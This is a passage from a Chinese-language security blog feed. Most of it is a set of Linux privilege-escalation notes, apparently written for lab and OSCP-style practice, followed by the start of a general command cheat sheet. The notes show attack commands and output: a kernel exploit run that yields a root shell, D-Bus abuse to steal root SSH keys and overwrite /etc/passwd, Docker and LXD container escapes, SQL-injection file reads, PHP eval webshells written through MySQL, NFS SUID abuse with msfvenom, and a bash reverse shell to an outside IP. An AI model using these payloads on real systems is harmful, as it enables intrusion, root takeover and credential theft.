<li><a href="https://rhn.redhat.com/errata/RHSA-2010-0894.html" target="_blank" rel="noopener">RHEL</a></li>
<li><a href="https://www.exploit-db.com/exploits/15620" target="_blank" rel="noopener">exploit</a></li>
</ul>
<h3 id="CVE-2002-0056"><a href="#CVE-2002-0056" class="headerlink" title="CVE-2002-0056"></a>CVE-2002-0056</h3><p>影响版本</p>
<p>Linux Kernel 2.6.39 &lt; 3.2.2 (x86/x64)</p>
<p>测试环境</p>
<p>内核:3.0.0.12-generic</p>
<p>版本：Ubuntu 11.10</p>
<p>Explodb-id:</p>
<ul>
<li><a href="https://www.exploit-db.com/exploits/18411" target="_blank" rel="noopener">18411</a></li>
<li><a href="https://www.exploit-db.com/exploits/35161" target="_blank" rel="noopener">35161</a></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ gcc -o 18411 18411.c</span><br><span class="line">$ .&#x2F;18411                                                                                                                                                                                        [56&#x2F;1648]</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;          Mempodipper        &#x3D;</span><br><span class="line">&#x3D;           by zx2c4          &#x3D;</span><br><span class="line">&#x3D;         Jan 21, 2012        &#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">[+] Waiting for transferred fd in parent.</span><br><span class="line">[+] Executing child from child fork.</span><br><span class="line">[+] Opening parent mem &#x2F;proc&#x2F;5163&#x2F;mem in child.</span><br><span class="line">[+] Sending fd 3 to parent.</span><br><span class="line">[+] Assigning fd 5 to stderr.</span><br><span class="line">[+] Reading su for exit@plt.</span><br><span class="line">[+] Resolved exit@plt to 0x8049520.</span><br><span class="line">[+] Calculating su padding.</span><br><span class="line">[+] Seeking to offset 0x8049514.</span><br><span class="line">[+] Executing su with shellcode.</span><br><span class="line"># whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>如果发现只执行到一半就没了，请检查你的获取的shell，该提权需要一个稳定的shell，如SSH。伪终端可以试下。</p>
<h2 id="其他第三方程序"><a href="#其他第三方程序" class="headerlink" title="其他第三方程序"></a>其他第三方程序</h2><h3 id="USBCreator-D-Bus"><a href="#USBCreator-D-Bus" class="headerlink" title="USBCreator D-Bus"></a>USBCreator D-Bus</h3><p>原文:<a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/" target="_blank" rel="noopener">USBCreator D-Bus Privilege Escalation in Ubuntu Desktop</a></p>
<p>译文:<a href="https://www.anquanke.com/post/id/181937" target="_blank" rel="noopener"> Ubuntu桌面版USBCreator D-Bus权限提升漏洞分析 </a></p>
<p>利用要求：</p>
<ul>
<li>sudo 用户组</li>
</ul>
<p>获取root的id_rsa。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdbus call --system --dest com.ubuntu.USBCreator --object-path &#x2F;com&#x2F;ubuntu&#x2F;USBCreator --method com.ubuntu.USBCreator.Image &#x2F;root&#x2F;.ssh&#x2F;id_rsa &#x2F;tmp&#x2F;id_rsa true</span><br></pre></td></tr></table></figure>

<p>如果root id_rsa不存在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp &#x2F;etc&#x2F;passwd .&#x2F;</span><br><span class="line">echo &#39;new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt;.&#x2F;passwd</span><br><span class="line">gdbus call --system --dest com.ubuntu.USBCreator --object-path &#x2F;com&#x2F;ubuntu&#x2F;USBCreator --method com.ubuntu.USBCreator.Image &#x2F;home&#x2F;nadav&#x2F;passwd &#x2F;etc&#x2F;passwd true</span><br></pre></td></tr></table></figure>


<h3 id="Docker提权"><a href="#Docker提权" class="headerlink" title="Docker提权"></a>Docker提权</h3><p>如果多用户借助docker共用一台机器的情况下，并且当前用户具有docker组的权限，可以直接运行一个镜像获得镜像里面的root权限，去修改镜像外的/etc/passwd来提权。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -v &#x2F;:&#x2F;mnt --rm -it alpine chroot &#x2F;mnt sh</span><br><span class="line">cat &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
<p>docker内部的/etc/passwd和外部的/etc/passwd一样，所以，可以直接往里面添加个用户。实现提权。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200712_215410.jpg" alt=""></p>
<h4 id="Docker-remote-api"><a href="#Docker-remote-api" class="headerlink" title="Docker remote api"></a>Docker remote api</h4><p>如果目标服务器开启了<code>docker api</code> ，但是未做访问控制。那么我就可以通过 <code>docker client</code> 或者 <code>http</code> 直接请求就可以访问这个 API，通过这个接口，我们可以新建容器，甚至是获取宿主机的<code>shell</code>。</p>
<ol>
<li>修改 / root/.ssh/authorized_keys 或 /etc/passwd等文件</li>
<li>修改 / etc/crontab 等计划任务文件</li>
</ol>
<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>暂时没有。。。以后有空填坑</p>
<p><a href="https://www.cnblogs.com/-mo-/p/11529387.html" target="_blank" rel="noopener">参考</a></p>
<h3 id="LXD容器提权"><a href="#LXD容器提权" class="headerlink" title="LXD容器提权"></a>LXD容器提权</h3><p>LXD是Linux的一个轻量级容器，如果当前用户具有lxd组权限，则可以导入一个镜像，挂载主系统下的磁盘内容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 攻击机器上执行</span></span><br><span class="line">git <span class="built_in">clone</span>  https://github.com/saghul/lxd-alpine-builder</span><br><span class="line"><span class="built_in">cd</span> lxd-alpine-builder</span><br><span class="line">./build-alpine</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此命令必须以root用户执行，之后会生成一个tar.gz的压缩包。</span></span><br><span class="line"></span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目标系统中执行</span></span><br><span class="line">wget http://Your-Vps-IP/alpine-v3.12-x86_64-20200908_2138.tar.gz -O /tmp/alpine-v3.12.tar.gz</span><br><span class="line">lxc image import ./alpine-v3.12.tar.gz --<span class="built_in">alias</span> alpine-v3.12</span><br><span class="line">lxc init alpine-v3.12 ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line">lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">lxc start ignite</span><br><span class="line">lxc <span class="built_in">exec</span> ignite /bin/sh</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20200909095740510.png" alt="image-20200909095740510"></p>
<p><img src="https://images.atsud0.me/images/post/image-20200909095753491.png" alt="image-20200909095753491"></p>
<p><img src="https://images.atsud0.me/images/post/image-20200909095818082.png" alt="image-20200909095818082"></p>
<h3 id="Kubernetes-容器"><a href="#Kubernetes-容器" class="headerlink" title="Kubernetes 容器"></a>Kubernetes 容器</h3><p>（（还没实验，先留坑</p>
<h4 id="CVE-2018-1002105"><a href="#CVE-2018-1002105" class="headerlink" title="CVE-2018-1002105"></a>CVE-2018-1002105</h4><h4 id="CVE-2017-1002101"><a href="#CVE-2017-1002101" class="headerlink" title="CVE-2017-1002101"></a>CVE-2017-1002101</h4><h3 id="Mysql提权"><a href="#Mysql提权" class="headerlink" title="Mysql提权"></a>Mysql提权</h3><p>参考文章:</p>
<ul>
<li><a href="https://xz.aliyun.com/t/1491" title="" target="">Mysql提权思路</a></li>
<li><a href="https://wh0ale.github.io/2019/01/06/2019-1-6-Mysql%E6%8F%90%E6%9D%83/" title="" target="">mysql提权</a></li>
<li><a href="https://www.cnblogs.com/jerrylocker/p/10890128.html" title="" target="">MySQL获取webshell的几种方式</a>

</li>
</ul>
<h4 id="sql注入读取文件without-sqlmap"><a href="#sql注入读取文件without-sqlmap" class="headerlink" title="sql注入读取文件without sqlmap"></a>sql注入读取文件without sqlmap</h4><p>示例： 读取/etc/passwd。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.56.104&#x2F;jabcd0cs&#x2F;ajax_udf.php?q&#x3D;1&amp;add_value&#x3D;odm_user%20UNION%20SELECT%201,load_file(0x2f6574632f706173737764),3,4,5,6,7,8,9</span><br><span class="line">http:&#x2F;&#x2F;192.168.56.104&#x2F;jabcd0cs&#x2F;ajax_udf.php?q&#x3D;1&amp;add_value&#x3D;odm_user%20UNION%20SELECT%201,load_file(CHAR(47, 101, 116, 99, 47, 112, 97, 115, 115, 119, 100)),3,4,5,6,7,8,9</span><br></pre></td></tr></table></figure>

<p>读取的文件名要进行转码,转码要求不能带引号</p>
<h4 id="写一句话获得webshell"><a href="#写一句话获得webshell" class="headerlink" title="写一句话获得webshell"></a>写一句话获得webshell</h4><h5 id="secure-file-priv写一句话"><a href="#secure-file-priv写一句话" class="headerlink" title="secure-file-priv写一句话"></a>secure-file-priv写一句话</h5><p>获取webshell的条件也是苛刻，首先</p>
<ul>
<li>GPC关闭</li>
<li>对web目录有写的权限</li>
<li>知道web目录的绝对路径</li>
<li>没有配置secure-file-priv</li>
</ul>
<p>首先查看数据库配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;%secure%&#39;;</span><br><span class="line">+--------------------------+-------+</span><br><span class="line">| Variable_name            | Value |</span><br><span class="line">+--------------------------+-------+</span><br><span class="line">| require_secure_transport | OFF   |</span><br><span class="line">| secure_auth              | ON    |</span><br><span class="line">| secure_file_priv         |       |</span><br><span class="line">+--------------------------+-------+</span><br><span class="line">select &#39;&lt;?php eval($_POST[admin])?&gt;&#39; into outfile &#39;&#x2F;home&#x2F;wwwroot&#x2F;https&#x2F;shell.php&#39;</span><br></pre></td></tr></table></figure>

<p>如果<code>outfile</code>函数不能用则可以使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &#39;&lt;?php eval($_POST[admin])?&gt;&#39; into dumpfile &#39;&#x2F;home&#x2F;wwwroot&#x2F;https&#x2F;shell.php&#39;</span><br></pre></td></tr></table></figure>

<h5 id="日志写入一句话"><a href="#日志写入一句话" class="headerlink" title="日志写入一句话"></a>日志写入一句话</h5><p>利用要求：</p>
<ul>
<li>管理员权限</li>
<li>知道网站的绝对路径</li>
</ul>
<p>必要选项：</p>
<ul>
<li>general log 指的是日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭。</li>
<li>general log file 指的是日志的保存路径。</li>
</ul>
<p>这两个选项能通过在mysql或者是在phpmyadmin中打开。执行一条sql语句便会被记录到日志文件中。所以只要把日志保存的路径和日志文件名设置成网站路径下的php，就可以生成一个文件，并把一句话代入到其中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set global general_log&#x3D;&#39;on&#39;;</span><br><span class="line">set global general_log_file&#x3D;&#39;D:&#x2F;phpstudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;xxx.php&#39;</span><br><span class="line">select &#39;&lt;?php eval($_POST[a]);?&gt;&#39;;</span><br></pre></td></tr></table></figure>
<h4 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create function sys_exec returns integer soname &#39;lib_mysqludf_sys.so&#39;;</span><br></pre></td></tr></table></figure>
<p>如果成功的话,就可以直接利用sys_exec去执行系统的命令.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select sys_exec(&#39;chmod u+s &#x2F;bin&#x2F;bash&#39;); # 如果执行成功,&#x2F;bin&#x2F;bash将会成为suid位文件,普通用户直接bash -p就能获得root权限.</span><br></pre></td></tr></table></figure>

<h3 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h3><a href="https://whale3070.github.io/oscp/2019/12/06/02-x/" title="" target="">oscp真题解析-NFS</a>

<h4 id="NFS版本漏洞"><a href="#NFS版本漏洞" class="headerlink" title="NFS版本漏洞"></a>NFS版本漏洞</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">searchsploit nfs | grep -v &#39;dos&#39; | grep -v &#39;windows&#39;</span><br></pre></td></tr></table></figure>
<h4 id="权限配置不当"><a href="#权限配置不当" class="headerlink" title="权限配置不当"></a>权限配置不当</h4><p>检查机器上的NFS配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;exports</span><br></pre></td></tr></table></figure>

<p>如果有<code>no_root_squash</code>这个选项，root用户就会对共享目录拥有至高的权限控制，就像是对本机的目录操作一样。</p>
<p>假设我们的目标机器上面存在这个配置要怎么利用呢？先用其他机器的root用户挂载目标机器上的NFS共享目录，然后用<code>msfvenom</code>生成一个<code>shell</code>在NFS的共享目录上。然后给予suid位权限，完成之后返回到目标机器上面的低权限用户上执行这个程序，就可以获得一个<code>root_shell</code>了。</p>
<p>在攻击机上以root用户操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir &#x2F;tmp&#x2F;nfs</span><br><span class="line">mount -o rw,vers&#x3D;3 10.10.10.10:&#x2F;tmp &#x2F;tmp&#x2F;nfs</span><br><span class="line">msfvenom -p linux&#x2F;x86&#x2F;exec CMD&#x3D;&quot;&#x2F;bin&#x2F;bash -p&quot; -f elf -o &#x2F;tmp&#x2F;nfs&#x2F;shell.elf</span><br><span class="line">chmod +xs &#x2F;tmp&#x2F;nfs&#x2F;shell.elf</span><br></pre></td></tr></table></figure>
<p>现在返回目标机上的低权限用户执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;tmp&#x2F;shell.elf</span><br></pre></td></tr></table></figure>

<a href="https://www.cesafe.com/html/6866.html" title="" target="">Linux NFS提权 Linux N​​FS共享权限提升</a>

<p>所以，也可以不需要生成一个木马的操作。我们可以直接以root用户身份复制攻击机上面的shell到共享目录中，给予suid权限，然后切换到目标机，执行该程序即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp &#96;which sh&#96; &#x2F;tmp&#x2F;nfs</span><br><span class="line">chmod +s &#x2F;tmp&#x2F;nfs&#x2F;sh</span><br><span class="line"></span><br><span class="line">-------目标机执行</span><br><span class="line">.&#x2F;sh -p</span><br></pre></td></tr></table></figure>




<h4 id="共享目录可写"><a href="#共享目录可写" class="headerlink" title="共享目录可写"></a>共享目录可写</h4><p>探测可挂载的目录。 可以看到/home/peter允许挂载，那么我们就可以挂载之后在自己的机器上添加一个用户，去操作这个用户的文件之类的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p 111 --script&#x3D;nfs* 192.168.56.7</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-07-12 07:40 EDT</span><br><span class="line">Nmap scan report for 192.168.56.7</span><br><span class="line">Host is up (0.00092s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">111&#x2F;tcp open  rpcbind</span><br><span class="line">| nfs-showmount: </span><br><span class="line">|_  &#x2F;home&#x2F;peter *</span><br></pre></td></tr></table></figure>

<p>写入操作。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir ~&#x2F;home</span><br><span class="line">sudo mount -o nolock 192.168.56.7:&#x2F;home&#x2F; &#x2F;home&#x2F;kali&#x2F;home&#x2F;</span><br><span class="line">sudo grounpadd -g 1005 peter</span><br><span class="line">sudo adduser peter -uid 1001 -gid 1005</span><br><span class="line"></span><br><span class="line">su peter</span><br><span class="line">ssh-keygen</span><br><span class="line">cat ~&#x2F;home&#x2F;.ssh&#x2F;id_rsa.pub &gt;&#x2F;home&#x2F;kali&#x2F;home&#x2F;peter&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">ssh peter@192.168.56.7</span><br></pre></td></tr></table></figure>



<p>使用以下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mount -o nolock 192.168.56.7:&#x2F;home&#x2F; &#x2F;home&#x2F;kali&#x2F;home&#x2F;</span><br></pre></td></tr></table></figure>

<p>挂在成功后权限位有问题(好像就只有nfs4会有问题。。)</p>
<p><img src="https://images.atsud0.me/images/post/image-20201130100953041.png" alt="image-20201130100953041"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mount -o nolock,vers&#x3D;3  192.168.56.7:&#x2F;home&#x2F; &#x2F;tmp&#x2F;home&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201130101625001.png" alt="image-20201130101625001"></p>
<p>共享目录可写的配置文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">peter@linsecurity:~$ cat &#x2F;etc&#x2F;exports</span><br><span class="line"># &#x2F;etc&#x2F;exports: the access control list for filesystems which may be exported</span><br><span class="line">#               to NFS clients.  See exports(5).</span><br><span class="line">#</span><br><span class="line"># Example for NFSv2 and NFSv3:</span><br><span class="line"># &#x2F;srv&#x2F;homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)</span><br><span class="line">#</span><br><span class="line"># Example for NFSv4:</span><br><span class="line"># &#x2F;srv&#x2F;nfs4        gss&#x2F;krb5i(rw,sync,fsid&#x3D;0,crossmnt,no_subtree_check)</span><br><span class="line"># &#x2F;srv&#x2F;nfs4&#x2F;homes  gss&#x2F;krb5i(rw,sync,no_subtree_check)</span><br><span class="line">#</span><br><span class="line">&#x2F;home&#x2F;peter *(rw)</span><br></pre></td></tr></table></figure>

<h4 id="敏感信息泄露-1"><a href="#敏感信息泄露-1" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h4><p>挂载NFS磁盘之后找到一些密码或者是私钥等。</p>
<h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><h4 id="SMB-Cry"><a href="#SMB-Cry" class="headerlink" title="SMB_Cry"></a>SMB_Cry</h4><h4 id="CVE-2010-0926-Samba-smbd默认配置目录遍历漏洞"><a href="#CVE-2010-0926-Samba-smbd默认配置目录遍历漏洞" class="headerlink" title="CVE-2010-0926 Samba smbd默认配置目录遍历漏洞 "></a><a href="https://www.cvedetails.com/cve/CVE-2010-0926/" target="_blank" rel="noopener">CVE-2010-0926 Samba smbd默认配置目录遍历漏洞 </a></h4><ul>
<li><a href="https://www.exploit-db.com/exploits/33599" target="_blank" rel="noopener">Samba 3.4.5 - Symlink Directory Traversal </a></li>
<li><a href="https://www.rapid7.com/db/modules/auxiliary/admin/smb/samba_symlink_traversal/" target="_blank" rel="noopener">Samba 3.4.5 - Symlink Directory Traversal-Metasploit</a></li>
<li><a href="https://github.com/roughiz/Symlink-Directory-Traversal-smb-manually" target="_blank" rel="noopener">Symlink-Directory-Traversal-smb-manually</a></li>
<li><a href="https://packetstormsecurity.com/files/85957/Samba-Remote-Directory-Traversal.html" target="_blank" rel="noopener">Samba-Remote-Directory-Traversal-packetstormsecurity</a></li>
</ul>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="rbash逃逸"><a href="#rbash逃逸" class="headerlink" title="rbash逃逸"></a>rbash逃逸</h3><ul>
<li><a href="https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/" target="_blank" rel="noopener">rbash逃逸</a></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh user@ip -t <span class="string">'bash --noprofile'</span></span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh user@ip -t <span class="string">"export TERM=xterm;python -c  'import pty;pty.spawn(\"/bin/bash\")'"</span></span><br><span class="line">ssh user@ip -t <span class="string">"export TERM=xterm;bash -c 'bash -i &gt;&amp;/dev/tcp/192.168.119.163/80 0&gt;&amp;1'"</span></span><br></pre></td></tr></table></figure>

<h3 id="Bash-dropping-privileges"><a href="#Bash-dropping-privileges" class="headerlink" title="Bash dropping privileges"></a>Bash dropping privileges</h3><p>当bash运行时，它会检查$UID是否与$EUID匹配。如果没有(通常是通过suid方式提权的，就会出现这种情况)，那么bash将删除特权。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp /bin/bash /tmp/b &amp;&amp; chmod +s /tmp/b</span><br><span class="line">/bin/b -p <span class="comment">### 维持特权</span></span><br></pre></td></tr></table></figure>

<p>用msf生成linux的二进制payload时可以添加<code>PrependSetuid=true</code>这个参数</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;netbiosX&#x2F;Checklists&#x2F;blob&#x2F;master&#x2F;Linux-Privilege-Escalation.md</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;swisskyrepo&#x2F;PayloadsAllTheThings&#x2F;blob&#x2F;master&#x2F;Methodology%20and%20Resources&#x2F;Linux%20-%20Privilege%20Escalation.md</span><br><span class="line">https:&#x2F;&#x2F;sushant747.gitbooks.io&#x2F;total-oscp-guide&#x2F;privilege_escalation_-_linux.html</span><br><span class="line">https:&#x2F;&#x2F;payatu.com&#x2F;guide-linux-privilege-escalation</span><br></pre></td></tr></table></figure>



<ul>
<li><a href="https://tryhackme.com/room/privescplayground" target="_blank" rel="noopener">privescplayground</a></li>
<li><a href="https://tryhackme.com/room/commonlinuxprivesc" target="_blank" rel="noopener">Common Linux Privesc</a></li>
<li><a href="https://segmentfault.com/a/1190000019948872" target="_blank" rel="noopener">NFS利用</a></li>
<li><a href="https://www.cesafe.com/html/6866.html" title="" target="">Linux NFS提权 Linux N​​FS共享权限提升</a></li>
<li><a href="https://docs.docker.com/engine/security/" target="_blank" rel="noopener">docker-security</a></li>
<li><a href="https://www.exploit-db.com/exploits/40394" target="_blank" rel="noopener">msf-docker</a></li>
<li><a href="https://www.anquanke.com/post/id/146799#h3-9" target="_blank" rel="noopener">利用PATH环境变量进行Linux提权</a></li>
<li><a href="https://www.cnblogs.com/sparkdev/p/9651622.html" target="_blank" rel="noopener">SUID</a></li>
<li><a href="https://blog.csdn.net/a1154490629/article/details/52190801" target="_blank" rel="noopener">/etc/passwd</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1038337" title="" target="">动态链接共享对象库提权</a></li>
<li><a href="https://www.secpulse.com/archives/72965.html" target="_blank" rel="noopener">利用通配符实现Linux本地提权-安全脉搏</a></li>
<li><a href="https://www.freebuf.com/articles/system/175453.html" target="_blank" rel="noopener">如何使用Cron Jobs实现Linux提权</a></li>
<li><a href="https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/" target="_blank" rel="noopener">Exploiting wildcards on Linux</a></li>
<li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="noopener">basic-linux-privilege-escalation</a></li>
<li><a href="https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099" target="_blank" rel="noopener">Day 44: Linux Capabilities Privilege Escalation via OpenSSL with SELinux Enabled and Enforced</a></li>
<li><a href="https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099" target="_blank" rel="noopener">Linux系统利用可执行文件的Capabilities实现权限提升 </a></li>
<li><a href="https://hack-tips.com/2020/02/21/how-to-find-nfs-mounted-drives-penetration-testing/" target="_blank" rel="noopener">how-to-find-nfs-mounted-drives-penetration-testing/</a></li>
</ul>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>sudo</tag>
        <tag>crontab</tag>
        <tag>path</tag>
        <tag>suid</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux部分实用命令</title>
    <url>/2020/04/14/Linux%E9%83%A8%E5%88%86%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>linux部分命令速查 for me。</p>
<a href="https://github.com/jlevy/the-art-of-command-line/blob/master/README-zh.md" title="" target="">命令行的艺术</a>
<a id="more"></a>

<p>获取命令帮助的网站<br><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">gtfobins</a><br><a href="https://www.runoob.com/linux/linux-command-manual.html" target="_blank" rel="noopener">Runoob</a></p>
<h3 id="查看用户-用户组"><a href="#查看用户-用户组" class="headerlink" title="查看用户|用户组"></a>查看用户|用户组</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd</span><br><span class="line">cat &#x2F;etc&#x2F;group</span><br></pre></td></tr></table></figure>
<p>linux中存放用户密码的文件<br><code>/etc/shadow</code> 加密过得~ </p>
<h3 id="显示某个文件的第几行"><a href="#显示某个文件的第几行" class="headerlink" title="显示某个文件的第几行"></a>显示某个文件的第几行</h3><p>显示文件的5到20行<br><code>sed -n &#39;5,20p&#39; firename</code></p>
<h3 id="删除文本换行符和空格"><a href="#删除文本换行符和空格" class="headerlink" title="删除文本换行符和空格"></a>删除文本换行符和空格</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk &#39;&#123;printf(&quot;%s&quot;,$0)&#125;&#39; tmp.txt | sed &#39;s&#x2F;\ &#x2F;&#x2F;g&#39; $1</span><br></pre></td></tr></table></figure>

<h3 id="linux-下删除文本空行"><a href="#linux-下删除文本空行" class="headerlink" title="linux 下删除文本空行"></a>linux 下删除文本空行</h3><p>grep</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep -v &#39;^$&#39; file</span><br></pre></td></tr></table></figure>
<p>sed</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sed &#39;&#x2F;^$&#x2F;d&#39; file</span><br></pre></td></tr></table></figure>
<p> awk</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk &#39;&#x2F;.&#x2F; &#123;print&#125;&#39; file 或 awk &#39;&#123;if($0!&#x3D;&quot; &quot;) print&#125;&#39;</span><br></pre></td></tr></table></figure>
<p>tr</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tr -s &quot;n&quot;</span><br></pre></td></tr></table></figure>
<p>除此之外，vim也可以在查看时。通过命令模式删除空行。vim在命令模式下输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%s&#x2F;^n&#x2F;&#x2F;g</span><br></pre></td></tr></table></figure>
<p>意思是全局替换所有以回车开头的字符，替换为空。如果有多个连续的空行，想保留一行。则只需在命令行模式输入下行即可：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%s&#x2F;^n$&#x2F;&#x2F;g</span><br></pre></td></tr></table></figure>
<h3 id="linux-shell-字符串反转-rev"><a href="#linux-shell-字符串反转-rev" class="headerlink" title="linux shell 字符串反转 rev"></a>linux shell 字符串反转 rev</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ echo $PATH|rev</span><br><span class="line">lrep_eroc&#x2F;nib&#x2F;rsu&#x2F;:lrep_rodnev&#x2F;nib&#x2F;rsu&#x2F;:lrep_etis&#x2F;nib&#x2F;rsu&#x2F;:nib&#x2F;rsu&#x2F;:nib&#x2F;lacol&#x2F;rsu&#x2F;:nibs&#x2F;lacol&#x2F;rsu&#x2F;</span><br></pre></td></tr></table></figure>

<h3 id="linux-shell-base64"><a href="#linux-shell-base64" class="headerlink" title="linux shell base64"></a>linux shell base64</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ echo $PATH|base64</span><br><span class="line">L3Vzci9sb2NhbC9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvYmluOi91c3IvYmluL3NpdGVfcGVy</span><br><span class="line">bDovdXNyL2Jpbi92ZW5kb3JfcGVybDovdXNyL2Jpbi9jb3JlX3BlcmwK</span><br></pre></td></tr></table></figure>
<p><a href="https://www.bejson.com/convert/ox2str/" target="_blank" rel="noopener">在线加密解密</a></p>
<h3 id="查找SUID位的文件"><a href="#查找SUID位的文件" class="headerlink" title="查找SUID位的文件"></a>查找SUID位的文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br><span class="line">find &#x2F; -perm &#x2F;4000 2&gt;&amp;1 | grep -v “Permission denied”</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>

<h3 id="查看Linux内核-系统版本"><a href="#查看Linux内核-系统版本" class="headerlink" title="查看Linux内核/系统版本"></a>查看Linux内核/系统版本</h3><p>cat /proc/version</p>
